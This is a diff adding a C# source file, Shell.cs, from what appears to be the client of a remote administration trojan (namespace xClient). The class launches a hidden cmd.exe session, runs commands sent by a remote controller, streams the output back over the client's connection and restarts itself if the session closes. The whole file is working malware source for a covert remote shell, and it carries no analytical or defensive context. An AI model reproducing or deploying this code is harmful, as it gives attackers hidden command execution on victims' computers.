@@ -1,0 +1,231 @@
+using System;
+using System.Diagnostics;
+using System.Globalization;
+using System.IO;
+using System.Text;
+using System.Threading;
+using xClient.Core.Packets.ClientPackets;
+
+namespace xClient.Core.Utilities;
+
+public class Shell : IDisposable
+{
+	private Process _prc;
+
+	private bool _read;
+
+	private readonly object _readLock = new object();
+
+	private readonly object _readStreamLock = new object();
+
+	private Encoding _encoding;
+
+	private StreamWriter _inputWriter;
+
+	private void CreateSession()
+	{
+		lock (_readLock)
+		{
+			_read = true;
+		}
+		CultureInfo installedUICulture = CultureInfo.InstalledUICulture;
+		_encoding = Encoding.GetEncoding(installedUICulture.TextInfo.OEMCodePage);
+		_prc = new Process
+		{
+			StartInfo = new ProcessStartInfo("cmd")
+			{
+				UseShellExecute = false,
+				RedirectStandardInput = true,
+				RedirectStandardOutput = true,
+				RedirectStandardError = true,
+				StandardOutputEncoding = _encoding,
+				StandardErrorEncoding = _encoding,
+				CreateNoWindow = true,
+				WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
+				Arguments = "/K"
+			}
+		};
+		_prc.Start();
+		RedirectOutputs();
+		ExecuteCommand("chcp " + _encoding.CodePage);
+		new DoShellExecuteResponse(Environment.NewLine + ">> New Session created" + Environment.NewLine).Execute(Program.ConnectClient);
+	}
+
+	private void RedirectOutputs()
+	{
+		ThreadPool.QueueUserWorkItem(delegate
+		{
+			RedirectStandardOutput();
+		});
+		ThreadPool.QueueUserWorkItem(delegate
+		{
+			RedirectStandardError();
+		});
+	}
+
+	private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
+	{
+		lock (_readStreamLock)
+		{
+			StringBuilder textbuffer = new StringBuilder();
+			textbuffer.Append((char)firstCharRead);
+			while (streamReader.Peek() > -1)
+			{
+				int num = streamReader.Read();
+				textbuffer.Append((char)num);
+				if (num == 10)
+				{
+					SendAndFlushBuffer(ref textbuffer, isError);
+				}
+			}
+			SendAndFlushBuffer(ref textbuffer, isError);
+		}
+	}
+
+	private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
+	{
+		if (textbuffer.Length == 0)
+		{
+			return;
+		}
+		string s = textbuffer.ToString();
+		byte[] bytes = Encoding.Convert(_encoding, Encoding.UTF8, _encoding.GetBytes(s));
+		string @string = Encoding.UTF8.GetString(bytes);
+		if (!string.IsNullOrEmpty(@string))
+		{
+			if (isError)
+			{
+				new DoShellExecuteResponse(@string, isError: true).Execute(Program.ConnectClient);
+			}
+			else
+			{
+				new DoShellExecuteResponse(@string).Execute(Program.ConnectClient);
+			}
+			textbuffer.Length = 0;
+		}
+	}
+
+	private void RedirectStandardOutput()
+	{
+		try
+		{
+			int firstCharRead;
+			while (_prc != null && !_prc.HasExited && (firstCharRead = _prc.StandardOutput.Read()) > -1)
+			{
+				ReadStream(firstCharRead, _prc.StandardOutput, isError: false);
+			}
+			lock (_readLock)
+			{
+				if (_read)
+				{
+					_read = false;
+					throw new ApplicationException("session unexpectedly closed");
+				}
+			}
+		}
+		catch (ObjectDisposedException)
+		{
+		}
+		catch (Exception ex2)
+		{
+			if (ex2 is ApplicationException || ex2 is InvalidOperationException)
+			{
+				new DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}", Environment.NewLine), isError: true).Execute(Program.ConnectClient);
+				CreateSession();
+			}
+		}
+	}
+
+	private void RedirectStandardError()
+	{
+		try
+		{
+			int firstCharRead;
+			while (_prc != null && !_prc.HasExited && (firstCharRead = _prc.StandardError.Read()) > -1)
+			{
+				ReadStream(firstCharRead, _prc.StandardError, isError: true);
+			}
+			lock (_readLock)
+			{
+				if (_read)
+				{
+					_read = false;
+					throw new ApplicationException("session unexpectedly closed");
+				}
+			}
+		}
+		catch (ObjectDisposedException)
+		{
+		}
+		catch (Exception ex2)
+		{
+			if (ex2 is ApplicationException || ex2 is InvalidOperationException)
+			{
+				new DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}", Environment.NewLine), isError: true).Execute(Program.ConnectClient);
+				CreateSession();
+			}
+		}
+	}
+
+	public bool ExecuteCommand(string command)
+	{
+		if (_prc == null || _prc.HasExited)
+		{
+			CreateSession();
+		}
+		if (_prc == null)
+		{
+			return false;
+		}
+		if (_inputWriter == null)
+		{
+			_inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
+		}
+		byte[] bytes = Encoding.Convert(Encoding.UTF8, _encoding, Encoding.UTF8.GetBytes(command));
+		string @string = _encoding.GetString(bytes);
+		_inputWriter.WriteLine(@string);
+		_inputWriter.Flush();
+		return true;
+	}
+
+	public Shell()
+	{
+		CreateSession();
+	}
+
+	public void Dispose()
+	{
+		Dispose(disposing: true);
+		GC.SuppressFinalize(this);
+	}
+
+	protected virtual void Dispose(bool disposing)
+	{
+		if (!disposing)
+		{
+			return;
+		}
+		lock (_readLock)
+		{
+			_read = false;
+		}
+		if (_prc == null)
+		{
+			return;
+		}
+		if (!_prc.HasExited)
+		{
+			try
+			{
+				_prc.Kill();
+			}
+			catch
+			{
+			}
+		}
+		_inputWriter.Close();
+		_inputWriter = null;
+		_prc.Dispose();
+		_prc = null;
+	}
+}
